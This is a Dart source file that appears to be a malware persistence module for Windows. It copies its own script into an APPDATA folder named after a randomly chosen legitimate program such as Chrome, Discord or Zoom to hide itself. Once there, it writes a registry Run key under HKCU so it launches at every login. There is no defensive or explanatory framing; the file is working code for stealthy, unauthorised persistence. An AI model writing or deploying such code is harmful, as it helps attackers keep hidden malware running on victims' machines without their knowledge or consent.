import 'dart:io';
import 'dart:math' as math;

void main() {
  final currentDir = Directory.current;
  final appDataDir = Directory(Platform.environment['APPDATA']!);

  if (!currentDir.path.startsWith(appDataDir.path)) {
    print("Not in the Appdata Executing Module");
    final softwareNames = [
      'Chrome',
      'Firefox',
      'Discord',
      'Spotify',
      'Zoom',
      'Notepad++',
      'WinRAR',
      'VLC',
      'Java',
      'Adobe Reader'
    ];

    final random = math.Random();
    final randomIndex = random.nextInt(softwareNames.length);
    final randomFolderName = softwareNames[randomIndex];

    final randomDir = Directory('${appDataDir.path}\\$randomFolderName');
    if (!randomDir.existsSync()) {
      randomDir.createSync();
    }

    final scriptPath = Platform.script.toFilePath();
    final scriptName = Platform.script.pathSegments.last;
    final newScriptPath = '${randomDir.path}\\$scriptName';

    File(scriptPath).copySync(newScriptPath);
    print('New Pth: $newScriptPath');
  } else {
    startup(Platform.resolvedExecutable, "ServiceName");
    print("Already in Appdata Dir");
  }
}

Future<void> startup(String path, String serviceName) async {
  final regQueryCommand =
      'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v $serviceName';
  final regQueryResult = await Process.run('cmd', ['/c', regQueryCommand]);
  if (regQueryResult.exitCode == 0) {
    print('$serviceName already exists in startup.');
    return;
  }

  final regAddCommand =
      'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v $serviceName /t REG_SZ /d "$path" /f';
  final regAddResult = await Process.run('cmd', ['/c', regAddCommand]);
  if (regAddResult.exitCode == 0) {
    print('$serviceName added to startup successfully.');
  } else {
    print('Error adding $serviceName to startup.');
  }
}
